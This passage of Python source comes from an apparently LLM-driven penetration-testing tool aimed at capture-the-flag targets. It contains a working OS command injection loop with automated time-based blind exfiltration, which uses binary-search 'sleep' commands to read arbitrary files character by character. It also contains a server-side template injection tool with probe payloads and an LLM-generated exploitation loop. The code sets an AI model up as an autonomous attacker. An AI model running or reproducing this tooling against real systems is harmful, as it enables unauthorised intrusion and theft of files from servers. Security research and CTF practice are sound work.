        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Exploit")
        
        context["history"].append({
            "payload": payload,
            "status": res["status"],
            "length": res["length"],
            "duration": res["duration"],
            "body": res["body"],
            "expectation": expectation
        })
        
        # REFLECTION - Analyze result
        reflect_prompt = f"""
Goal: {goal}
Payload: {payload}
Expectation: {expectation}
Actual Result: Status {res['status']}, Duration {res['duration']}s, Length {res['length']}
Response Body: {res['body']}

Analyze:
1. Did the result match your expectation?
2. Is there evidence of command execution?
3. Is the goal achieved (flag found, RCE confirmed)?
4. Did we confirm a file path using time delay?

If path confirmed, output: <VERDICT>PATH_CONFIRMED</VERDICT> and <PATH_CONFIRMED>/path/to/file</PATH_CONFIRMED>
If goal is reached, output: <VERDICT>SUCCESS</VERDICT>
If more work needed, output: <VERDICT>CONTINUE</VERDICT>
Provide brief analysis.
"""
        
        reflection = (await llm.ainvoke(reflect_prompt)).content
        print(f"   [i] Analysis: {reflection}...")
        
        # Check for Path Confirmation -> Trigger Automated Exfiltration
        path_match = re.search(r'<PATH_CONFIRMED>(.*?)</PATH_CONFIRMED>', reflection)
        if path_match:
            path = path_match.group(1).strip()
            print(f"\n⚡ [AUTO] Path confirmed at {path}. Starting automated Time-Based Exfiltration...")
            
            prefix = ""
            if ";" in payload: 
                prefix = payload.split("if")[0]
            else: 
                prefix = baseline + ";"
            
            extracted_flag = await _run_os_time_blind_exfiltration(
                path, prefix, url, method, body, body_type, headers, cookies, 
                context["baseline"]["duration"]
            )
            
            normalized_exfil = _normalize_blind_exfil_output(extracted_flag)
            extracted_flag_token = _extract_real_flag_token(normalized_exfil)
            if extracted_flag_token:
                print(f"\n🎯 GOAL REACHED (Blind Exfil)!")
                return f"✅ SUCCESS: {goal}\nExtracted Flag: {extracted_flag_token}"
            if normalized_exfil:
                print("   [!] Automated exfiltration produced non-flag output; continuing manual exploitation.")
            else:
                print("   [!] Automated exfiltration failed. Retrying manually...")

        # Check for success
        response_flag = _extract_real_flag_token(res["body"])
        if response_flag:
            print(f"\n🎯 GOAL REACHED!")
            return f"✅ SUCCESS: {goal}\nPayload: {payload}\nResponse: {res['body']}"
        if "<VERDICT>SUCCESS</VERDICT>" in reflection.upper():
            print("   [!] Reflection claimed SUCCESS without literal flag evidence; continuing.")
        
        # Update strategy based on reflection
        context["current_strategy"] += f"\n\nIteration {i+1} reflection: {reflection}"
    
    return f"⚠️ Max iterations reached. Vulnerability confirmed but goal not fully achieved."

async def _run_os_time_blind_exfiltration(path, prefix, url, method, body, body_type, headers, cookies, baseline_duration):
    """Automated Binary Search Exfiltration for OS Command Injection."""
    print(f"\n🔄 STARTING BINARY SEARCH EXFILTRATION FOR: {path}")
    extracted = ""
    threshold = baseline_duration + 2.0
    
    for attempt in range(2):
        extracted = ""
        for pos in range(1, 50):
            low, high = 32, 126
            
            found_char = False
            while low <= high:
                mid = (low + high) // 2
                
                cmd = f"if [ $(cat {path} | cut -c {pos} | tr -d '\\n' | od -An -t u1) -gt {mid} ]; then sleep 2; fi"
                if attempt == 1:
                     cmd = f"if [ $(cat {path} | cut -c {pos}) > $(printf \\$(printf '\\%03o' {mid})) ]; then sleep 2; fi"

                payload = f"{prefix}{cmd}"
                res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label=f"Pos{pos} mid={mid}")
                
                if res["duration"] > threshold:
                    low = mid + 1
                else:
                    high = mid - 1
            
            char_code = low
            if 32 <= char_code <= 126:
                extracted += chr(char_code)
                print(f"      [+] Found char: '{chr(char_code)}' | Current: {extracted}")
                found_char = True
                if char_code == 125 and "flag{" in extracted:
                    return extracted
            else:
                if not found_char and len(extracted) > 0:
                    return extracted
                break
        
        if len(extracted) > 5:
             return extracted
             
    return extracted

# ========== SSTI TOOL ==========

async def SSTITool(url, body, baseline, method="GET", body_type="form", headers=None, cookies=None, max_attempts=20):
    """Server-Side Template Injection (SSTI) detection and exploitation tool with reflection."""
    goal = "Retrieve flag"
    context = {"baseline_value": baseline, "baseline": {}, "history": [], "goal": goal, "confirmed_vuln": False}
    
    print(f"\n🚀 SERVER-SIDE TEMPLATE INJECTION (SSTI) | Goal: {goal} | Baseline: {baseline}")
    print("="*60)
    
    # [STEP 0] BASELINE - Test with normal input
    print("\n[STEP 0] BASELINE TEST")
    context["baseline"] = await _send_smart_injection(baseline, url, method, body, body_type, headers, cookies, label="Baseline")
    
    # [STEP 1] PROBING - Test SSTI payloads for different template engines
    print("\n[STEP 1] SSTI PROBING")
    probe_payloads = [
        "{{7*7}}",
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{7*'7'}}",
        "{$smarty.version}",
        "{php}echo 'test';{/php}",
        "${7*7}",
        "#{7*7}",
        "#set($x=7*7)$x",
        "<%= 7*7 %>",
        "${7*7}",
        "[[${7*7}]]",
    ]
    
    probe_results = []
    for payload in probe_payloads:
        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Probe")
        probe_results.append({
            "payload": payload,
            "status": res["status"],
            "length": res["length"],
            "duration": res["duration"],
            "body": res["body"]
        })
        context["history"].append(probe_results[-1])
        
        # Check for mathematical evaluation (7*7=49)
        if "49" in res["body"]:
            print(f"\n⚠️ SSTI DETECTED!")
            print(f"   Payload: {payload}")
            print(f"   Response contains '49' (7*7 evaluated)")
            context["confirmed_vuln"] = True
            context["engine_hint"] = payload
            break
        
        # Check for template engine specific outputs
        if any(keyword in res["body"].lower() for keyword in ["<class", "smarty", "config", "subclasses"]):
            print(f"\n⚠️ SSTI DETECTED!")
            print(f"   Payload: {payload}")
            print(f"   Response contains template engine artifacts")
            context["confirmed_vuln"] = True
            context["engine_hint"] = payload
            break
    
    if not context["confirmed_vuln"]:
        return "❌ No SSTI vulnerability detected in initial probing."
    
    # [STEP 2] ANALYZER - Get strategy from LLM
    print("\n[STEP 2] STRATEGIC ANALYSIS")
    analyzer_prompt = DeepPentestPrompt.ssti_analyzer_prompt.format(
        goal=goal,
        baseline=json.dumps(context["baseline"]),
        probe_results=json.dumps(probe_results)
    )
    
    strategy = (await llm.ainvoke(analyzer_prompt)).content
    print(f"--- Strategy ---\n{strategy}\n")
    context["current_strategy"] = strategy
    
    # [STEP 3] REFLECTION LOOP - Generate and test payloads
    print("\n[STEP 3] EXPLOITATION LOOP")
    for i in range(max_attempts):
        print(f"\n--- Iteration {i+1}/{max_attempts} ---")
        
        # Generate next payload
        gen_prompt = DeepPentestPrompt.ssti_generator_prompt.format(
            goal=goal,
            strategy=context["current_strategy"],
            history=json.dumps(context["history"][-3:]),
            baseline=json.dumps(context["baseline"])
        )
        
        gen_resp = (await llm.ainvoke(gen_prompt)).content
        
        # Parse JSON response
        try:
            gen_data = json.loads(gen_resp.strip().split("```json")[-1].split("```")[0])
            payload = gen_data["payload"]
            expectation = gen_data["expectation"]
        except:
            payload = gen_resp.strip()
            expectation = "Analyze response"
        
        # Execute payload
        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Exploit")
        
        context["history"].append({
            "payload": payload,
            "status": res["status"],
            "length": res["length"],
            "duration": res["duration"],
            "body": res["body"],
            "expectation": expectation
        })
        
        # REFLECTION - Analyze result
        reflect_prompt = f"""
Goal: {goal}
Payload: {payload}
Expectation: {expectation}
Actual Result: Status {res['status']}, Duration {res['duration']}s, Length {res['length']}
Response Body: {res['body']}

### ANALYSIS STEPS:

**1. ANALYZE PAYLOAD INTENT:**
What was this payload trying to do?
If the payload targets a specific directory/path, note it.

**2. ANALYZE RESULT:**
- Did the payload execute successfully?
- What information did the response return?
- If response shows filenames and payload targeted a directory, combine them to get full paths

**3. CHECK GOAL:**
Does the response contain the ACTUAL flag content (flag{{...}} or FLAG{{...}})?
- ✅ YES → Output <VERDICT>SUCCESS</VERDICT>
- ❌ NO → Continue to step 4

**4. ROOT CAUSE (if not successful yet):**
Why didn't we get the flag yet?
- Found a path/filename but haven't read it yet? → State the full path and next action
- Command failed or returned empty? → Why?
- Still searching? → What to try next?

### OUTPUT:
<VERDICT>SUCCESS</VERDICT> or <VERDICT>CONTINUE</VERDICT>

Brief analysis following the 4 steps above.
"""
        
        reflection = (await llm.ainvoke(reflect_prompt)).content
        print(f"   [i] Analysis: {reflection}")
        
        # Check for success
        if "<VERDICT>SUCCESS</VERDICT>" in reflection.upper() or "flag{" in res["body"].lower():
            print(f"\n🎯 GOAL REACHED!")
            return f"✅ SUCCESS: {goal}\nPayload: {payload}\nResponse: {res['body']}"
        
        # Update strategy based on reflection
        context["current_strategy"] += f"\n\nIteration {i+1} reflection: {reflection}"
    
    return f"⚠️ Max iterations reached. Vulnerability confirmed but goal not fully achieved."
